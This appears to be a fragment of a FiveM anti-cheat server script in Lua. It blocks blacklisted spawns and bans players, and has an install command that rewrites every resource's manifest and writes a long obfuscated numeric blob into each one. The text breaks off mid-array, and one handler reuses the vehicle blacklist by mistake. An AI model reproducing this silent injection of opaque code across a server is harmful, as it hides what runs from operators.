                        local a9 = FIREACEXP.ExplosionsList[a8.explosionType]
                        if a9.log and not a9.ban then
                                FIREACLog(a7, "­čöąDetected Explosion: "..a9.name, "The user created this explosion and got detected", false, false)
                        end;
                        if a9.ban then
                                FIREACLog(a7, "­čöąDetected Explosion: "..a9.name, "The user created this explosion and got detected", true, true)
                        end
                end;
                CancelEvent()
        end
end
end)
AddEventHandler('entityCreating', function(entity)
        if FIREACS.AntiObjectSpawner then
                local src = NetworkGetEntityOwner(entity)
                FIREACObjectLog(entity)
                if not isAdmin(src) then
                local model = GetEntityModel(entity)
                for _,blacklistedentity in ipairs(FIREAC.BlacklistedEntities) do
                        if model == GetHashKey(blacklistedentity) then
                                CancelEvent()
                                TriggerClientEvent('FIREAC:DeleteEntity', entity)
                                FIREACLog(src, " Blacklisted Object", "Player Try for spawn Black List Object: **"..blacklistedentity.."**", FIREACS.AntiObjectSpawnerKick, FIREACS.AntiObjectSpawnerBan)
                                break
                        else
                        end
                end
        end
end
end)
AddEventHandler('entityCreating', function(car)
        if FIREACS.BlackListVehicle then
                local src = NetworkGetEntityOwner(car)
                if not isAdmin(src) then
                local model = GetEntityModel(car)
                for _,blacklistedentity in ipairs(FIREACVEHICLES.BlackListVehicle) do
                        if model == GetHashKey(blacklistedentity) then
                                CancelEvent()
                                TriggerClientEvent('FIREAC:DeleteEntity', car)
                                FIREACLog(src, " Blacklisted Vehicle", "Player Try For Spawn Black List Vehicle: **"..blacklistedentity.."**", FIREACS.BlackListVehicleKick, FIREACS.BlackListVehicleBan)
                        break
                        end
                end
        end
end
end)
AddEventHandler('entityCreating', function(weapon)
        if FIREACS.BlackListVehicle then
                local src = NetworkGetEntityOwner(weapon)
                if not isAdmin(src) then
                local model = GetEntityModel(weapon)
                for _,blacklistedentity in ipairs(FIREACVEHICLES.BlackListVehicle) do
                        if model == GetHashKey(blacklistedentity) then
                                CancelEvent()
                                TriggerClientEvent('FIREAC:DeleteEntity', weapon)
                                FIREACLog(src, " Blacklisted Vehicle", "Player Try For Spawn Black List Vehicle: **"..blacklistedentity.."**", FIREACS.BlackListVehicleKick, FIREACS.BlackListVehicleBan)
                        break
                        end
                end
        end
end
end)
AddEventHandler('entityCreating', function(ped)
if FIREACS.AntiBlackListPed then
        local src = NetworkGetEntityOwner(ped)
        local model = GetEntityModel(ped)
        for _,blacklistedentity in ipairs(FIREACPEDS.BlacklistedPeds) do
                if model == GetHashKey(blacklistedentity) then
                        CancelEvent()
                        TriggerClientEvent('FIREAC:DeleteEntity', ped)
                        FIREACLog(src, " Blacklisted Ped", "Player Try For Spawn Black List Ped : **"..blacklistedentity.."**", FIREACS.AntiBlackListPedKick, FIREACS.AntiBlackListPedBan)
                        break
                end
        end
end
end)
AddEventHandler('entityCreating', function(Building)
if FIREACS.AntiBuildingSpawner then
        local src = NetworkGetEntityOwner(Building)
        local model = GetEntityModel(Building)
        for _,blacklistedentity in ipairs(FIREACBUILDING.BlackListBuilding) do
                if model == GetHashKey(blacklistedentity) then
                        CancelEvent()
                        TriggerClientEvent('FIREAC:DeleteEntity', Building)
                        FIREACLog(src, " Blacklisted Building", "Player Try For Spawn Black List Building: **"..blacklistedentity.."**", FIREACS.AntiBuildingSpawnerKick, FIREACS.AntiBuildingSpawnerBan)
                        break
                end
        end
end
end)
local validResourceList
local function collectValidResourceList()
validResourceList = {}
for i=0,GetNumResources()-1 do
        validResourceList[GetResourceByFindIndex(i)] = true
        end
end
collectValidResourceList()
-- This makes sure that the resource list is always accurate
AddEventHandler("onResourceListRefresh", collectValidResourceList)
RegisterNetEvent("FIREAC:CmR")
AddEventHandler("FIREAC:CmR", function(givenList)
for _, resource in ipairs(givenList) do
if not validResourceList[resource] then
FIREACLog(source, " ResourceChecker", "This player tried to inject a resource that is not listed: **"..resource.."**", true, true)
    break
end
end
end)
if FIREACS.AntiClearPedTasks then
AddEventHandler("clearPedTasksEvent", function(source, data)
    if data.immediately then
                FIREACLog(source, "Anti Clear Ped Tasks", "Try For Clear Ped Tasks", FIREACS.AntiClearPedTasksKick, FIREACS.AntiClearPedTasksBan)
    end
end)
end
local ad = "FIREAC";
local ae = "__resource"
local af = nil;
RegisterCommand("fire", function(source, ai, aj)
if source == 0 then
        if ai[1] == "install" then
                if ai[2] == "fx" then
                        print("intalling in Resource fxmanifest")
                        ae = "fxmanifest"
                elseif ai[2] == nil then
            print("intalling in Resource __resource")
                        ae = "__resource"
                end;
                if not af then
                        af = {
                                0,
                                0,
                                0
                        }
                end;
                local ak = GetNumResources()
                for al = 0, ak - 1 do
                        local am = GetResourcePath(GetResourceByFindIndex(al))
                        if string.len(am) > 4 then
                                setall(am)
                        end
                end;
                print(" Anti Injection installed on ".. af[1].. "/".. af[2] .." | Script Skiped : ".. af[3] .. "")
                print(" Now Restart Server !!!!!!")
                af = nil
        end;
        if ai[1] == "uninstall" then
                if not af then
                        af = {
                                0,
                                0,
                                0
                        }
                end;
                        ad = "FIREAC"
                        if ai[2] == "fx" then
                                print("**UNINSTALLING FROM fxmanifest.lua ONLY!**")
                                ae = "fxmanifest"
                        elseif ai[2] == nil then
                                print("**UNINSTALLING FROM __resource.lua ONLY!**")
                                ae = "__resource"
                        end;
                        local ak = GetNumResources()
                        for al = 0, ak - 1 do
                                local am = GetResourcePath(GetResourceByFindIndex(al))
                                if string.len(am) > 4 then
                                        setall(am, true)
                                end
                        end;
                        print(" Anti Injection installed on ".. af[1].. "/".. af[2] .." | Script Skiped : ".. af[3] .. "")
                        print(" Now Restart Server !!!!!!")
                        af = nil
                end
        else
end
end, true)
function setall(an, ao)
local ap = io.open(an.."/"..ae..".lua", "r")
local aq = split(an, "/")
local ar = aq[#aq]
aq = nil;
if ap then
        if not ao then
                ap:seek("set", 0)
                local as = ap:read("*a")
                ap:close()
                local at = split(as, "\n")
                local au = false;
                local av = false;
                for U, aw in ipairs(at) do
                        if aw == "client_script \""..ad..".lua\"" then
                                au = true
                        end;
                        if not av then
                                local ax = string.find(aw, "client_script") or -1;
                                local ay = string.find(aw, "#") or -1;
                                if ax ~= -1 and (ay == -1 or ax < ay) then
                                        av = true
                                end
                        end
                end;
                if av then
                        as = as.."\nclient_script \""..ad..".lua\""
                        if not au then
                                os.remove(an.."/"..ae..".lua")
                                ap = io.open(an.."/"..ae..".lua", "w")
                                if ap then
                                        ap:seek("set", 0)
                                        ap:write(as)
                                        ap:close()
                                end
                        end;
                        local az = [[
                        h = {1618294286,{"166831","2410116","1710147","221144","503222","136150","613210","4112336","9312514","551019","838036","571086","679725","6811018","681019","1003233","816119","963236","5112324","3512515","611014","6310123","173225","45614","433250","941238","8212546","851026","23763","9712131","2311010","9412012","755615","33223","756132","693237","3212324","7712545","941028","57611","211212","8911040","7612037","936929","721182","3711131","443235","856127","82328","5012329","9512524","191046","427741","41972","610110","511544","3111625","2611444","1411146","797727","681014","61102","4311733","133228","266121","103210","512322","9012540","151045","57731","6011124","4511615","1910516","621111","3711025","61329","26135","873233","1912315","3612540","731019","208423","911059","89748","131033","8611120","507739","3910115","701107","1611743","753241","696140","9327","3112311","651256","281017","281037","839725","3112132","119822","4011723","641058","6510837","1810011","113224","73614","523221","5012313","6112522","501029","616745","7510539","3910126","6711026","92993","5510144","41321","886137","813215","2912345","712526","861020","797611","6712144","7411019","2512026","838336","8410112","9211810","610137","3011048","103219","996123","703249","6712332","3312537","671017","717727","607717","9910131","311030","311749","913246","726118","153227","112321","961256","611031","407012","909740","8011015","911633","389736","117713","8910113","4011043","4211723","956940","411188","7611119","763240","176142","273232","1212340","3112532","92104","71711","48826","1011713","549820","4912133","987729","301016","7811048","7611716","473248","846146","843216","5412343","7812532","781037","867639","798243","61325","126117","143238","1612327","10012515","411026","956620","3211430","5111720","9011633","1009711","9611021","948020","2811416","4710145","341098","711055","131174","7010911","553210","866150","953219","541237","3612525","711022","837229","279746","6610913","87744","69971","1710222","5810527","199710","243222","686134","243210","1312313","5012511","301010","27338","411022","948349","9310140","639928","843220","306112","23223","6312344","5912549","97106","19653","6810819","521128","310415","629731","398622","6510110","9511650","929717","823241","36139","80327","7512350","5012519","651026","227532","9911116","257143","9211717","968335","5512225","446941","811076","973225","826150","33240","5912323","2812535","741010","138324","2210424","349712","4911022","231052","3611746","77714","8010150","511026","981175","54328","886114","23227","6312315","2612531","31010","367647","331212","411050","7812023","828230","210130","5711831","7411111","23221","766130","593221","212336","4212519","441039","639723","311147","9210539","1610145","4611537","597720","1010127","2611028","91179","393218","36135","913228","4612326","7812545","771046","428744","739724","9411412","477714","510114","151106","3011719","8325","576130","63327","4212333","6912539","361024","9010022","3910120","541202","16775","2710139","9111036","561173","503248","66125","973225","6612339","6212547","631023","187217","519720","1610921","5721","739743","712047","4010524","379712","893243","656148","153212","541234","2912545","651021","217221","929744","6610935","903228","556147","493240","3112347","641252","41029","596623","2010548","111227","8211047","3510142","6211538","78325","336118","733248","491232","1812528","92105","16707","3310116","421105","1010026","8410546","8211015","21882","467721","6610125","9711014","6611711","93232","71611","983234","5912347","8012529","45109","626537","481085","8211246","5010439","379714","148617","193230","66129","23236","8412320","7812533","91107","9782","2412130","898024","1311442","7010148","8210919","5410548","301173","1410914","97323","306143","513221","912317","7512530","841017","8011510","449924","1911432","611127","3810841","7010837","323225","786117","423225","711036","7110523","211089","40105","1712222","721221","871227","2211643","303223","386123","303247","8011029","4510546","7710815","221013","4111934","781012","241144","511022","5311823","8911618","21039","621043","4610528","6011121","6511739","7811723","3810520","4011118","8911947","6911425","2510245","5010136","3811639","9411924","101019","5411423","8010243","9910532","1811126","923244","776129","833218","5311017","6810545","2810842","171018","3110815","1610814","8410833","4110850","715235","9567","12555","65246","473238","506119","40325","9211024","51059","810824","461035","817532","396538","327514","22657","976536","387511","136540","957512","46524","83753","233222","126144","69327","1511027","31053","8510825","911035","6811748","2110013","711944","8410011","5210637","943247","176147","303222","1311048","6810535","3910837","931011","477142","6110328","7810325","9210321","7710317","703243","806142","383234","961101","431051","551084","391023","7010641","510037","605140","60547","25410","58502","484913","455111","67328","346135","763213","1211037","9210532","1710829","791043","1007536","229040","2010611","512020","783241","256130","343225","1011030","271053","7810822","331022","1810533","7510431","611446","401178","4810336","963247","826138","663242","9211013","7410538","9810837","96101","678731","316520","936848","508541","227343","10322","396150","23217","1211023","2810517","110821","611016","326714","9111447","481178","1411536","169737","6410012","3410115","3611426","933247","166114","393239","5611037","111053","1210836","731012","877020","2610135","8411044","381007","2710534","4211030","51887","633243","96117","263214","81107","9010546","221081","781042","8011118","298424","959742","65981","2810834","7510138","37325","23618","30329","8511037","491053","1010824","181048","197645","8710142","339721","781076","451019","9811424","31772","910145","611043","131179","243233","566147","433244","411026","2010526","9210828","921049","110845","8911133","699917","35977","771087","973241","3411434","171015","901156","511030","19728","2210950","8810127","261029","916719","171058","8311648","5010535","3212248","5410148","7811035","264636","216734","3611443","651019","139740","4911635","4710129","78842","851048","9311415","4110113","149739","910050","604019","971022","131173","7211019","5995","3211619","710532","8811116","411029","864043","204147","48102","913240","553244","42328","503214","643229","1003225","58329","803235","3811432","1410131","4511542","5811026","819745","4310947","231019","533214","956144","863218","827147","4910126","671162","426716","5711749","8411443","8711427","3110117","751105","461163","158247","6710131","6311537","321119","281171","511444","139949","7210150","127839","399710","1710924","1110118","334031","73414","621041","613241","543224","463226","813232","53220","303214","223218","80329","746715","5510519","5011633","1410536","7712247","741018","721108","314621","6872","629742","71052","8411646","854041","585013","894826","944823","24812","684145","731048","863238","903233","25322","993235","783216","713210","203244","213217","4511933","7310430","821052","9810843","3210139","953249","3711649","491149","3811733","4610141","143230","6610029","6111150","41322","221049","963219","13248","633211","903215","803232","35327","793244","683238","56329","433229","34321","853238","266724","510549","8911632","791052","8512245","5710148","3711021","84469","108746","119727","7510534","7911646","164028","365032","33488","1004848","724841","1004139","781014","203227","763221","823242","723211","823219","1003228","34323","913215","33234","913237","19323","123220","341029","3811142","311448","643231","8510222","34413","1010339","313247","191059","51108","413238","2711050","9310139","8112046","611161","33448","799545","1007128","35327","9210026","3411112","373223","42101","69326","433215","20327","393239","743216","133224","31323","943240","453210","41329","713238","843247","97328","393249","913246","453241","3410534","191022","803233","9611611","131214","4411230","2210146","194033","9010325","454128","8611","2612","73450","9111613","199713","509825","6110837","2910113","623435","499715","1711018","8510024","79322","9810245","10012618","29618","83435","91015","3912038","931127","1511146","5611418","7811637","6811516","833450","9911611","4710427","4810149","6711036","643244","971017","453228","83247","883243","1003222","673215","14325","243237","33218","49324","100324","123210","573213","603226","90324","113249","963216","663249","853232","88324","893219","4810543","9110239","84324","4510332","984649","106713","2311427","9010124","679750","9411649","110129","1007720","751013","5711026","2711727","941266","896128","6211037","3010537","310841","613249","549731","2811026","8210020","273244","651164","621216","311250","731011","85401","841032","974627","566730","8511426","2210111","669723","9411628","91012","937723","5710126","1711010","3111741","86414","916141","786133","673422","710224","6611738","3311037","559923","8611648","1610520","7211137","971108","453438","3011632","2510422","5910121","3111047","393242","221010","443241","73234","643211","193214","123234","133226","233237","87323","773221","823240","83241","603233","583245","223212","143215","523225","963248","633230","413231","28321","33323","593220","503245","423230","501052","6210250","883219","4410223","751262","496127","733438","328744","459724","181147","407747","8910118","3811014","4811710","473428","619749","6011050","1310042","583247","1310249","112619","666122","64342","427812","549739","8211615","9310522","481187","8710139","688526","607333","783417","87975","2711039","9510022","223241","6610215","9412627","256111","753448","2511850","29825","248033","673439","799742","7111050","2010022","483217","5510243","6112618","68612","383410","418246","219725","8510334","4210150","1855","1007327","483422","229713","5711021","7810015","533223","3810211","2912633","39616","373411","487440","36977","9812150","63776","7010140","6611040","10011735","693445","5971","111019","731006","733224","3210233","1112630","496133","523437","518645","46932","437739","703422","993220","4511632","210435","8110120","251104","353213","81011","863230","303249","483229","463229","533230","633213","383246","403228","63245","883216","43244","433232","723232","63249","203222","973217","873210","463247","243215","503226","71326","15329","703211","37327","643250","83230","483230","263235","1810228","8611740","61992","2410713","6410946","1210144","664010","47349","307746","5510124","7411029","4911716","243225","498743","2310534","191164","8610419","20327","2851","367342","943234","737034","4011726","8811013","4011642","4510528","6611140","5711046","593425","154111","181036","573249","333232","79326","27324","453245","453235","923235","553216","913224","6323","643216","993224","63243","343218","253217","59328","393233","9325","493222","623234","313218","763224","463245","583220","3810132","2011050","51008","71321","81050","23234","143220","143210","313221","523244","333213","72326","38326","353238","283235","373216","773226","683220","78324","163228","413215","63219","35327","943240","643229","9210116","4610816","6611522","751017","6310531","471025","233224","2110348","244612","97327","131102","4610536","8411633","5310539","479737","3410823","501053","2312244","8910123","198420","9010420","2810131","851091","5210142","5512640","386129","781109","3310513","601081","50326","6511628","510424","361011","1211036","301040","11945","38935","10916","34944","1391","1510232","2211738","709925","7510747","501099","2510124","764028","3341","527721","771019","1711042","5711735","173221","508737","2110538","1611623","5310431","32328","888514","127341","633210","917035","5511744","2311026","9011635","981056","1911140","3011044","313437","18411","37109","37325","63243","573220","723229","503250","953219","77327","113220","243224","333233","723245","473229","693226","72327","23241","163219","183247","23237","1003232","1003212","5910129","3511018","2810037","991038","303220","553217","83222","513248","763239","243217","43213","293223","663250","593249","793227","953244","763238","623249","43246","113221","3310140","191104","331009","211022","223242","623218","42324","923211","553217","883227","303216","173247","23234","453221","823232","823232","8710113","8011023","911006","901016","413243","493226","513226","583216","24321","873233","33236","693230","710128","441106","5210021","851019","153219","843219","393238","293234","331016","4211019","7810017","22416","77108","486743","631052","9311641","2310534","1112241","2310114","3811024","44639","67671","501147","5210120","669742","8711642","9110141","208441","8410446","5311449","921013","729719","4910014","874025","1610239","9411724","81106","559941","1511641","121054","7111117","211101","694040","284120","821023","72675","871056","3011639","5010535","412224","711011","5111038","44466","658727","379746","310510","4511647","704019","85033","634829","71481","694830","61415","321017","5711913","8410415","4210532","4710821","9710123","5328","381163","6011447","5111750","5310129","213213","8210046","1911140","96326","421019","82679","6510517","4011642","9810539","5812221","1610147","7411050","544621","598714","199745","7810533","351163","834034","581094","989730","7411646","271048","354618","7811411","24977","311021","1810015","6111131","3610934","154050","43513","454844","944849","64850","86449","83214","17537","534847","954836","914842","234147","414147","831020","45945","5293","8610833","8211147","449939","559726","2810835","683221","5211031","45974","8610949","3910146","643221","106146","723210","57714","9710148","8511618","686728","621171","5511410","9411435","7110124","331109","4611622","518212","9510124","2311521","7411145","1711719","3611414","559910","7810112","337842","999742","7510940","4810113","1403","954137","751042","9610539","3910234","883223","728040","8610829","93975","1311049","5210134","394621","116716","5911420","7710141","879718","8111635","110135","577741","9810150","3311049","1211734","7612629","586148","111023","2610545","9310823","233225","491118","6511444","913234","23809","5510810","319719","411030","4010135","704614","5910037","9110118","389844","2011717","3710322","8712627","626137","9211012","7810538","510849","1003234","6211635","6710426","710132","111040","33210","581047","363238","6310222","461175","489938","910744","8010934","110150","994014","733417","50804","5211746","329835","2610825","4810524","29947","803223","997722","631011","8711037","311741","994028","91768","5412117","6811023","1312022","984147","95341","904112","831035","4210111","5010810","351159","321014","5710515","7010234","853217","6310131","994615","4210039","671014","129849","591172","7310337","4612615","676142","3311038","4910512","7710840","533220","561169","3810447","1910141","741109","13222","731015","183237","1910236","3911723","889918","4410737","3210926","611017","134041","973439","45877","599746","471163","7110129","6811417","813215","737723","8510140","5111018","3411729","533434","714113","993220","573233","751013","2910119","561085","601151","691015","4710533","4810215","183241","786816","7011120","8911238","29973","991091","5110516","531107","4310146","824619","486732","31143","3910114","949732","9211648","8310111","767711","4510124","1811023","8211735","412640","736113","521108","4710524","3310839","963228","6611618","6410444","7010137","2611042","95323","71016","16322","441024","1411734","43993","251071","3610938","8110142","96406","283421","956835","391118","8611222","159739","8410916","8210521","2111045","841012","613240","837729","4910136","5211011","6711723","87406","833543","235013","744111","643420","814131","29101","410114","2310811","8811510","2110117","9810541","9110220","453229","33768","5811740","5912031","584625","3671","431145","7610113","269718","5611619","3710123","257722","4110127","5511013","7311743","4512610","426132","811046","1810540","2410835","323243","4111635","2510441","5310133","6311032","31322","49105","403243","7710215","811723","189910","9310741","1510942","910140","714047","543426","877640","411730","6312020","113216","17723","8110125","2311048","5711750","574043","903543","825031","214143","63410","564122","581015","5910150","6810812","4911512","1310121","1010538","1410241","213224","578319","71199","99730","210333","298521","587335","204638","606736","3511422","9110143","84974","2111625","4610147","487713","4110140","591103","6311710","6112627","276148","3811017","3910525","7510827","313231","2411642","7210423","4010130","1311015","591024","513229","6410243","8911725","929926","7110739","3210946","7110123","794033","83410","808316","7611944","429712","571032","393224","967743","9110130","3111026","3911723","27341","94125","27103","721011","6410828","10011534","4710123","2410540","6010233","973234","927815","6310529","4211541","3510528","54620","946732","9311427","8810142","909722","7611613","9910141","647737","8310136","9811024","521176","621269","956150","2311037","2210511","110815","73223","8911641","8810411","10010137","3611046","761045","293240","2610221","5811748","349933","8710725","31092","110116","754028","78346","89783","8810522","2711510","8110514","43232","567750","4710147","791105","3111731","303434","34121","641050","7610142","581084","1411522","1110133","9010521","1310230","503238","412049","5111512","5910134","51058","3311417","169725","734647","206732","5211445","2610122","319727","7411629","9410148","84777","6410139","4211011","5711729","8212628","686128","61108","4710510","610827","763214","3611647","8110425","9110150","211027","331047","623212","4410218","3911713","26998","510721","3010946","1910136","464013","373418","208822","4311542","4810139","491054","9711447","679723","73214","157733","3210121","4911048","6711743","783440","184142","681040","6210132","8910828","6511513","9710111","8910516","191023","633250","37768","531215","2211025","212049","235613","704622","71677","581149","8510147","32978","5211627","3910112","727730","3410129","2011039","971176","401264","706135","1411050","9710549","61085","813238","4711640","541045","5510141","7411029","42104","323250","2010234","10011715","469934","9810731","201099","9610111","904023","513432","567646","8612124","3211012","212050","783234","487716","4010150","2311020","1011734","44404","573511","57562","354147","113424","154112","901024","4910137","121083","1911546","8610129","7210514","5210235","92328","827627","2312119","6311010","7812043","536910","5911819","341117","164635","296712","761143","2610135","679717","8111639","6810144","287735","1110122","7111044","581172","9412640","2616","5911011","831051","2710833","903211","7511650","4310448","3710121","1001101","561045","153215","5710210","7411738","42995","3110725","1610938","8510127","354025","133449","907611","9812112","241106","721201","943249","77726","6610124","7611044","5811739","26401","357810","701176","4910739","4910136","344137","693443","654142","651011","6410110","110817","8711549","4410122","5910515","3010225","963241","767713","859721","2210138","5211514","8311611","10011444","8811139","357714","8410131","731108","8411729","444637","316720","7311425","7210129","729725","9711621","1410117","477742","2610126","3911036","651178","2412622","22616","1311050","201059","8910847","383220","561163","3910422","121013","3011038","321029","3810239","2211716","119926","3810744","541095","441011","904034","743444","647736","1975","7910144","691154","7411639","7711419","5411117","853239","597741","4010134","901103","6511720","813426","324114","45104","5610144","5610828","2111517","1910142","9010510","8910224","83228","697737","291117","7511643","810546","8411138","7011050","534625","886723","3011412","1510129","359735","6311620","5210139","2778","8510138","611107","3911713","112639","706130","5111029","5610547","6910823","663220","2711619","3110441","6910131","3411022","601030","93247","5310237","541176","11999","7110748","410943","2110148","74036","113438","457728","511143","7911619","7410515","611136","7411021","583239","667718","5910137","7711019","4511713","123435","64129","961010","3210148","921088","441156","4910142","9010514","2710245","763228","678424","2110516","369742","991031","2811128","687727","481016","421108","5211741","964622","846742","8011450","6510126","239725","9711634","9710144","177739","261015","7411050","1911722","691262","1006132","611033","1110543","3910830","853241","1211113","321146","133220","567748","317322","507923","1810038","6810027","7710410","3211945","5411723","7510538","5710124","803247","9412633","16114","433236","4311018","4110513","801086","183238","851164","541048","5610132","8111031","131017","283235","4510231","811728","789938","4710715","6210928","8210113","254034","89347","68447","891051","159730","9910347","1611143","63329","77737","2710149","7711024","911735","33432","204111","991046","7910136","521084","8811519","5810149","1210518","1910244","213220","8810312","399731","211214","759839","521176","5010521","1710849","2310015","63467","196735","6511427","5910130","759712","9811635","4410140","74775","2810116","7011021","3011719","9012643","696143","631101","481058","5710838","173228","3311629","731047","1310136","1311017","991040","983215","610244","1011711","529944","7310736","7810911","4010126","194032","903432","15695","421171","8810829","4610147","5311044","443218","6405","603517","544943","204127","27344","55419","371011","9610125","291088","111546","791012","3210545","9510230","24321","726727","5510548","5210146","7111045","479923","6210121","734641","486744","5611422","8110135","479712","711623","2410133","99777","510121","911028","5411724","4812615","96115","3911050","310519","5510827","123239","8811649","1310439","5510128","6611016","991041","133214","701028","711728","729936","7310735","411095","921014","364035","313427","33767","59717","7611834","789720","95322","217732","3110129","10011025","8711747","353415","484134","931025","6910129","5510844","31154","3310112","4710546","5410235","82328","117636","9112133","8511011","2612015","328311","810150","6011836","3610135","7011023","804626","93676","4211413","9810148","639710","211642","3810135","637724","5210122","7411041","7111732","4312631","76119","9511034","31051","5110824","403211","4111647","2510419","710128","6111038","311025","433228","7510235","10011747","44993","2010713","621096","7410132","944042","813447","727633","2912125","7611017","8712031","33325","407747","6710110","631103","8011733","734013","913513","905543","44124","123444","504131","681039","6010123","4310836","141153","301019","3710549","1110231","723215","267726","1007746","261012","5311028","661177","784636","426738","9911411","2610146","339729","9611638","1210131","217715","7410142","41109","5211743","3012618","486117","2811021","710544","9810843","83326","211622","1710432","8510136","11102","13324","701016","9110213","8711731","629928","5410738","3610946","281013","66404","713447","17641","712113","4211029","1812032","383230","61773","3910130","2511014","4111718","104026","443511","637734","717734","364124","393413","6419","561042","2910150","2910823","6011539","461012","510511","3210241","573217","327047","69974","271108","61162","27975","557715","6410136","911045","1011737","226925","4811840","4011118","354625","136719","6711437","861017","969717","791162","10010146","51774","6410133","6211024","7411735","221266","766122","441107","9610545","9610827","953224","5511631","3410447","731018","2711049","461024","703226","710239","511745","239915","171073","2610933","3110141","484033","883429","7708","839728","9311017","3711624","179729","853214","677738","6010128","2111047","4011720","963415","56416","41107","1810141","771081","5411510","9110147","2210514","8110212","1003249","637120","988234","2911723","7989","841217","247735","2810114","7011038","3111747","484623","626725","3911433","910116","1009714","6011613","5810128","917720","5710135","1211026","6411750","2512635","786124","5711018","5410520","9710811","953234","2811631","510417","6010127","711109","651033","643245","251027","2011743","83996","110711","1610938","8910117","124045","193448","848247","9911729","889812","2812110","873230","547732","1910148","8711012","2911748","113434","34137","21027","6710112","910850","1311529","8910146","7510541","661029","483223","1007636","708217","344618","386748","1011413","710148","179739","201165","6710110","317740","551019","7011017","811713","9512618","696129","211033","3010546","3210815","61325","2711636","3210413","41014","9411037","761012","1210250","111747","129930","8410721","3210928","810145","434048","373426","427617","3512143","5311029","8312033","69322","57749","6110111","311024","6911711","84045","28353","464915","344842","224123","943421","294150","74101","841019","9010832","9111519","5210146","371056","510246","213221","846636","2911436","1711717","3811639","29736","8311046","888010","4511415","8110130","231098","211054","2911741","2610938","664637","776725","4311446","2010142","759711","6111616","3410147","417715","7710146","6111024","4311749","351269","356125","5811038","6610510","5410848","1003244","9411637","731047","5610125","411050","41043","95325","7110214","3211743","119928","7210740","2110923","4810136","804029","60341","136621","8811418","3811720","411626","86977","1111021","603243","778047","2611440","1710147","510935","7110542","4111731","261094","313421","59412","961031","1710137","5810814","2111539","1910134","3110532","410213","243217","597231","41978","7410911","697725","129719","7710230","2210514","59715","134627","176721","6811411","9910145","819733","4211631","7910150","707725","3510148","5311013","1311723","8612618","68611","471107","281056","271088","873235","5811627","471044","310110","121105","62103","94326","4210245","3611731","459940","8710741","3510919","5710115","254016","903447","477211","59977","501091","413237","907710","689726","4910225","2410530","569714","613246","45774","2210136","1611038","4311729","393425","164140","761020","8510122","4610829","591157","710138","231052","11029","73227","207335","2311034","278312","1110128","219949","74634","587644","7711139","1710342","3511135","3612636","796113","9011050","6310513","591089","49321","3011624","5210415","21016","1611043","341039","433250","9310221","1111749","63992","9610729","5210936","431012","694017","923417","18318","211078","7610511","9110034","233222","59775","2710113","6311022","9211742","244027","973536","725113","694131","573427","624122","291047","5010117","601086","3611539","210112","8310530","3210241","653235","946524","4910833","8311231","9410445","819721","1008614","9610141","7811615","89716","664627","67673","7911418","6010149","179743","9111629","310136","78773","9410110","2411021","1811745","5512615","996116","9911046","181057","811089","51326","1111611","6610418","5710120","9811010","571050","863210","7410235","9911726","47999","2510715","4510934","611017","694049","723426","116540","481084","2411242","4810427","1009726","433223","188634","5010117","5411623","779725","19329","617747","1610143","2211045","771178","213411","82411","41328","61010","6610145","1310845","71159","2610116","2210529","810244","833238","727534","631111","487132","5711729","608330","3812218","90696","5210746","224631","536736","3311431","8710135","19729","1811633","421014","107738","21011","5811046","3811721","8412647","176128","8411015","481051","4610832","23221","3011629","1410418","1910110","2611010","461028","753235","9210234","7411728","649919","981074","6010925","1610111","134035","84345","307621","4212149","1111016","2712011","823229","527747","610131","4311045","611725","154035","903519","55521","844127","903445","694125","421014","471019","310836","1001154","5710146","9410526","9310228","863220","1008319","671041","219741","351109","5210511","931179","377743","8610145","821102","8511726","12463","926713","511433","1410125","319745","6511638","1110118","337738","5110121","8911018","481177","6712614","226124","9011021","7910518","7110846","633223","7211629","8810411","4210141","1211040","151041","603230","991023","3111747","329937","1810742","2610925","721014","954042","233439","728330","1310421","159750","3711043","1710524","501178","96322","467719","51012","5211045","3611722","523441","314113","84105","810111","2210817","9611528","8710124","8910539","10010220","213216","217643","591214","8211028","2912030","718244","6210143","551189","8311139","194646","266744","9811431","9310128","75979","4911622","4210110","757748","6910143","4711048","10011722","9012620","106121","6311034","4910527","241083","3321","3711624","8710439","5110110","321107","451042","41325","4210238","41177","949947","4310747","4710945","581017","814043","71342","367643","2712145","1811045","4412021","13241","787748","131012","9211027","2311745","14034","218227","7410123","211817","6811133","514131","723417","424138","49104","3910116","3810838","1411526","10010115","8410522","510222","643216","999728","4311430","7010548","9410137","5911534","967726","2310132","61104","941175","584612","526724","111412","5110143","769735","711614","4610138","67740","6610112","2211046","711744","1712644","316116","511035","3210547","4910827","263219","8811142","1311433","483216","999839","391173","9611636","9211626","8411142","3911016","628419","9310149","621207","1911639","668813","69791","8410240","6010231","4511513","7410123","5611644","583215","7812625","946143","83324","4411037","2110529","110839","853217","8011633","9210436","741019","6311039","2106","283214","801022","3611726","37994","991079","1710948","4110145","774011","903431","25652","8711429","1810534","3710139","5011535","843247","59778","3610138","7811044","2211725","643450","44131","29102","2310127","9210818","1111522","1210130","4510537","8010235","683234","498716","60976","941147","857726","5010141","8811043","451178","8112621","636115","8811025","6110516","6910836","753216","271164","281046","9210122","8711036","951026","863247","291057","4210236","953249","988712","58971","1911450","857731","6910138","9111049","931174","91464","387342","5811044","4810536","8211627","2910550","63971","6510825","9810524","5812221","310132","648421","5210446","1810143","4210923","910140","8812625","66117","5311029","781055","610846","323213","2511616","961044","4210114","7811022","251011","283245","1910240","2511718","289911","3410721","5610920","3810130","84046","933435","418532","2011512","9210148","783222","618728","239726","7411427","73239","77744","2310126","971106","4411748","27406","60837","921073","7110519","5310050","353248","807734","2010129","8211041","7611722","40418","653421","26415","62106","383236","8010119","2111014","1210049","163246","59102","9810127","3310848","4811549","9510126","2110539","3510227","533219","2910013","7810132","612025","777723","4810139","5011038","4911737","314610","666730","241147","8510118","95976","4411615","8510125","127733","8610115","9211036","5611749","3312624","866124","221109","1710538","4310825","293221","691161","6810444","8010137","6111010","71103","713216","381029","5111741","149914","4210746","4010924","7210138","394037","143436","816846","4210142","1012015","583210","217713","251013","4711044","6911740","573449","994130","201023","910124","3910820","871152","310127","2510519","651028","433227","977723","139738","2810131","811515","1011646","5611443","2911126","26695","10011439","239749","5512634","236140","8311040","2510540","1310847","473216","311626","4210428","331011","7211019","601019","33231","3110238","6411727","109941","361073","3110916","910120","154035","783412","607724","69742","6610130","4511541","8911610","1811422","6711123","693229","537711","8810146","721109","9511729","264040","206944","9811424","399715","544127","183425","934141","13324","591022","9010124","6310821","611521","410146","141053","7310223","363236","12729","67975","10010919","567243","619722","1612022","5110515","27977","284627","706712","4711427","551018","69721","9711625","6710118","857746","801011","411036","5211736","641263","616150","7711034","7810511","601086","903241","8211614","851045","481015","981104